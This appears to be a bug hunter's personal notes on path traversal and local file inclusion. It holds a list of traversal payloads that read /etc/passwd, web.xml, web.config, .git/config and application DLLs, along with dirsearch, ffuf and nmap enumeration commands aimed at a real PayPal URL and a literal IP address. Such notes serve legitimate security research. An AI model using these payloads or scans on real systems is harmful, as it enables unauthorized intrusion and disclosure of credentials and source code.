##### Chain bug
- LFI to credential disclose to Auth bypass to RCE
- LFI to git then RCE
- LFI to SSH path read then RCE
- LFI to `web.config`(IIS)
##### Eg
```
previewFilePath=/etc/passwd
fileName=/WEB-INF/web.xml
download?fileName=/WEB-INF/web.xml
fileName=/META-INF/
editorImpl=../../../WEB-INF/web.xml
nextPageName=..%2f..%2f..%2fWEB-INF%2fweb.xml
../.git/config
../etc/passwd
/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
fileName=../../web.config
DownloadCategoryExcel?fileName=../../global.asax
DownloadCategoryExcel?fileName=../../bin/Company.Web.Api.dll
```
##### Dirsearch
- Run
```
cd /Users/rahulacharya/Tools/dirsearch
python3 -m venv path/to/venv
source path/to/venv/bin/activate
```
- command 1
```
python3 dirsearch.py -u "https://payouts.paypal.com/hw2web/dashboard" -x 400,404,406 --exclude-sizes=246B
```
#####  FFUF
###  Technolog
###### JAVA
- extension
```
xhtml, htm, jsp, do, html, jsf, jsp, cgi, xml, zip, 7z, txt, csv
```
###### IIS
- extension
```
dll, exe, xml, aspx, asp, asmx, ashx, html, zip, 7z, txt, csv
```
- find iis using nmap this command 
	- `nmap -p80 --script http-iis-short-name-brute 71.167.30.116`
	- also namp RDP (is RDP open in any subs then it's IIS)
###### PHP
- extension
```
php, php3, PhP, zip, 7z, txt, csv
```
###### VHOST
- Command
```
curl "https://example.com" -H "Host: example"
```
- eg. below error
![[Pasted image 20250714071245.png]]
##### Resources
- [Path traversal on U.S. Dept Of Defense](https://hackerone.com/reports/217344)
- [Local File Inclusion In Registration Page](https://hackerone.com/reports/1007799)
- [Bitmoji source code is accessible](https://hackerone.com/reports/301812)
- [A Journey of Limited Path Traversal To RCE With $40,000 Bounty!](https://medium.com/@HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea)
- [TOPFILEREADING](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPFILEREADING.md)
- https://medium.com/@mudasserhussain1111/hacking-microsoft-iis-enumerating-iis-for-v-39de5a27f101
